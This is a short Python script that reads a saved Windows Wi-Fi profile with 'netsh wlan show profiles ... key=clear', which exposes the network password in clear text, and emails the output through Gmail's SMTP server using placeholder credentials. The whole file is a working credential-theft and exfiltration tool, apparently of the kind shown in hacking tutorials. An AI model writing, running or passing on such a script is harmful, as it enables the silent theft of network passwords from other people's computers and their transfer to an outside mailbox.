import subprocess, smtplib


# Defining a function to send the email
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


wifi_scan_command = "netsh wlan show profiles Ujjwal key=clear"
output = subprocess.check_output(wifi_scan_command, shell=True)
send_mail("email_id", "password", output)
